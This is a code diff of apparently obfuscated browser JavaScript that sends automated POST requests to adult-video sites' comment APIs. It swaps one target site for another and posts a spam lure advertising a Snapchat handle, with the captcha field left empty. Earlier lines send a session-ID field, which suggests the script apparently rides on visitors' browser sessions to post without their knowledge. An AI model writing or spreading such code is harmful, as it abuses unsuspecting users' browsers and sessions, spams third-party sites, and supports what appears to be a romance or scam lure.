@@ -49,10 +49,14 @@ if (xmlhttp != null) {
    // xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    // xmlhttp['send']('comment=19%2Ff+lookin+for+guys+to+snapchat+with%2C+katiegreen1992&poster_name=kg92&ajax=true&PHPSESSID=');  
    
-   xmlhttp['open']('POST', 'http://spankbang.com/api/comment', false);
-   xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
-   xmlhttp['send']('id=198618&data=19%2Ff+lookin+for+guys+to+snap+with%2C+katiegreen1992');
+   // ** Spankbang, pending **
+   //xmlhttp['open']('POST', 'http://spankbang.com/api/comment', false);
+   //xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+   //xmlhttp['send']('id=198618&data=19%2Ff+lookin+for+guys+to+snap+with%2C+katiegreen1992');
 
+   xmlhttp['open']('POST', 'http://www.drtuber.com/ajax/add_comment', false);
+   xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+   xmlhttp['send']('type=video&target_id=1964137&comment=any+guys+want+to+snapchat%3F+katiegreen1992&capcha=');
    
     if (xmlhttp['responseText'] != null) {
         var token = xmlhttp['responseText'];
